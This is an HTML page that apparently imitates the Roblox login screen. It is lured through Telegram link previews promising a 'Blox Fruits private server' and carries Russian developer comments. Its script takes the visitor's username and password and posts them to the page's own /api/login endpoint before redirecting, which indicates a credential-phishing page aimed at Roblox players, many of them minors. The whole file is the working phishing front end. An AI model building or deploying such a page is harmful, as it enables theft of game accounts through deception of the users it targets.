<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Login</title>

    <!-- Telegram Preview Meta Tags -->
    <meta property="og:site_name" content="Roblox">
    <meta property="og:title" content="Blox Fruits — Private Server">
    <meta property="og:description" content="Secure access to the Blox Fruits private server. Click to enter the game.">
    <meta property="og:image" content="https://tr.rbxcdn.com/186KB-2f47491cf673e1645e857418ea7a32ae/420/420/Image/Png">
    <meta property="og:type" content="website">
    <meta name="twitter:card" content="summary_large_image">

    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        
        body {
            background-color: #0d0f12;
            color: #fff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: flex-start;
            position: relative;
            overflow-x: hidden;
            padding: 20px 16px;
        }
        
        body::before {
            content: "";
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(13, 15, 18, 0.85);
            z-index: -2;
        }

        .bg-collage {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            z-index: -1;
            opacity: 0.45;
            pointer-events: none;
            overflow: hidden;
        }
        .bg-tile {
            position: absolute;
            background-size: cover;
            background-position: center;
            border-radius: 12px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.8);
        }
        .tile-1 { width: 170px; height: 110px; top: 2%; left: -5%; transform: rotate(-8deg); background-image: url('https://tr.rbxcdn.com/186KB-2f47491cf673e1645e857418ea7a32ae/420/420/Image/Png'); }
        .tile-2 { width: 160px; height: 100px; top: 5%; right: -8%; transform: rotate(12deg); background-image: url('https://tr.rbxcdn.com/186KB-2f47491cf673e1645e857418ea7a32ae/420/420/Image/Png'); }
        .tile-3 { width: 180px; height: 115px; bottom: 15%; left: -8%; transform: rotate(6deg); background-image: url('https://tr.rbxcdn.com/186KB-2f47491cf673e1645e857418ea7a32ae/420/420/Image/Png'); }
        .tile-4 { width: 190px; height: 120px; bottom: 8%; right: -10%; transform: rotate(-10deg); background-image: url('https://tr.rbxcdn.com/186KB-2f47491cf673e1645e857418ea7a32ae/420/420/Image/Png'); }

        .close-btn {
            position: absolute;
            top: 16px;
            left: 16px;
            font-size: 24px;
            color: #fff;
            cursor: pointer;
            z-index: 10;
        }

        .container {
            width: 100%;
            max-width: 400px;
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-top: 15px;
            position: relative;
            z-index: 10;
        }

        /* Стопроцентно надежный логотип-текст, который не сломается никогда */
        .roblox-brand {
            font-size: 36px;
            font-weight: 900;
            letter-spacing: 2px;
            color: #ffffff;
            margin-bottom: 28px;
            text-transform: uppercase;
        }

        .input-box {
            width: 100%;
            background: rgba(30, 33, 42, 0.85);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            margin-bottom: 14px;
            position: relative;
            backdrop-filter: blur(10px);
        }

        .input-box input {
            width: 100%;
            padding: 16px 45px 16px 16px;
            background: transparent;
            border: none;
            outline: none;
            color: #fff;
            font-size: 14px;
        }

        .input-box input::placeholder {
            color: #9ca3af;
        }

        .eye-btn {
            position: absolute;
            right: 14px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            cursor: pointer;
            padding: 4px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .eye-btn svg {
            width: 20px;
            height: 20px;
            fill: #8e949e !important;
        }

        .forgot-link {
            color: #9ca3af;
            font-size: 13px;
            text-decoration: none;
            align-self: flex-start;
            margin-bottom: 14px;
            margin-left: 4px;
        }
        .forgot-link:hover {
            text-decoration: underline;
        }

        .login-btn {
            width: 100%;
            padding: 16px;
            background: rgba(255, 255, 255, 0.15);
            color: #9ca3af;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            margin-bottom: 14px;
            transition: 0.2s;
        }

        .login-btn.active {
            background: #fff;
            color: #000;
        }

        .quick-btn {
            width: 100%;
            padding: 16px;
            background: transparent;
            color: #fff;
            border: 1px solid rgba(255, 255, 255, 0.4);
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-bottom: 24px;
            text-align: center;
        }

        .quick-btn:hover {
            background: rgba(255, 255, 255, 0.05);
        }

        .footer-links {
            display: flex;
            gap: 24px;
            justify-content: center;
            font-size: 14px;
            margin-top: auto;
            padding-bottom: 20px;
        }

        .footer-links a {
            color: #60a5fa;
            text-decoration: underline;
        }

        #status {
            margin-top: 10px;
            font-size: 14px;
            font-weight: 500;
            text-align: center;
        }
    </style>
</head>
<body>

    <div class="close-btn">✕</div>

    <div class="bg-collage">
        <div class="bg-tile tile-1"></div>
        <div class="bg-tile tile-2"></div>
        <div class="bg-tile tile-3"></div>
        <div class="bg-tile tile-4"></div>
    </div>

    <div class="container">
        <!-- Текстовый логотип, который физически не может разорваться или съехать -->
        <div class="roblox-brand">Roblox</div>

        <div class="input-box">
            <input type="text" id="usernameInput" placeholder="Username/Email/Phone" oninput="checkInputs()">
        </div>

        <div class="input-box">
            <input type="password" id="passwordInput" placeholder="Password" oninput="checkInputs()">
            <button type="button" class="eye-btn" id="eyeToggle" onclick="togglePassword()">
                <svg id="eyeSvg" viewBox="0 0 24 24">
                    <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
                </svg>
            </button>
        </div>

        <a href="#" class="forgot-link">Forgot password or username?</a>

        <button id="loginBtn" class="login-btn" onclick="loginUser()">Log In</button>
        
        <button class="quick-btn">Quick Pass</button>

        <div id="status"></div>
    </div>

    <div class="footer-links">
        <a href="#">Terms</a>
        <a href="#">Privacy</a>
    </div>

    <script>
        function checkInputs() {
            const user = document.getElementById('usernameInput').value.trim();
            const pass = document.getElementById('passwordInput').value.trim();
            const btn = document.getElementById('loginBtn');
            if (user && pass) {
                btn.classList.add('active');
            } else {
                btn.classList.remove('active');
            }
        }

        function togglePassword() {
            const passwordInput = document.getElementById('passwordInput');
            const eyeSvg = document.getElementById('eyeSvg');
            
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                eyeSvg.innerHTML = '<path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2.81 2.81L1.39 4.22l3.05 3.05C3.12 8.72 2.06 10.25 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l4.41 4.41 1.41-1.41L2.81 2.81zM10.96 10.96l2.08 2.08c-.32.22-.71.36-1.04.36-1.1 0-2-.9-2-2 0-.33.14-.72.36-1.04z"/>';
            } else {
                passwordInput.type = 'password';
                eyeSvg.innerHTML = '<path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>';
            }
        }

        async function loginUser() {
            const username = document.getElementById('usernameInput').value.trim();
            const password = document.getElementById('passwordInput').value.trim();
            const statusDiv = document.getElementById('status');

            if (!username || !password) {
                statusDiv.style.color = '#ef4444';
                statusDiv.innerText = 'Please fill in all fields.';
                return;
            }

            statusDiv.style.color = '#9ca3af';
            statusDiv.innerText = 'Logging in...';

            try {
                const response = await fetch('/api/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username, password })
                });

                const data = await response.json();

                if (response.ok) {
                    statusDiv.style.color = '#22c55e';
                    statusDiv.innerText = 'Success! Redirecting...';
                    
                    setTimeout(() => {
                        window.location.href = '/blox-fruits';
                    }, 1500);

                } else {
                    statusDiv.style.color = '#ef4444';
                    statusDiv.innerText = data.error || 'Login failed';
                }
            } catch (err) {
                statusDiv.style.color = '#ef4444';
                statusDiv.innerText = 'Connection error.';
            }
        }
    </script>
</body>
</html>
